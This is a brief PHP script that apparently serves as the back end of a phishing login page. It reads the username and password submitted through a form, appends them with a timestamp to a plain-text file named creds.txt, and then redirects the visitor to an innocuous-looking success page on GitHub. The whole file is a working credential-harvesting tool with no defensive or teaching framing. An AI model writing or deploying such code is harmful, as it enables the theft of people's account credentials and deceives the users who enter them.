<?php
	date_default_timezone_set("Asia/kolkata");
	$current_time=time();
	$present_info=date("Y/m/d --- H:i:s ",$current_time);
	$user=$_POST['username'];
	$pass=$_POST['password'];
	$file=fopen("creds.txt","a");
	fwrite($file,"Current Date/Time : ".$present_info."\n");
	fwrite($file,"USERNAME : " .$user. "\n");
	fwrite($file,"PASSWORD : " .$pass. "\n");
	fwrite($file,"- - - - - - - - - - - - - - - - - - - - \n");
	fclose($file);
        echo"hi";
        header("Location:https://github.com/JagarapuManoj/hi/blob/main/success.html");
?>
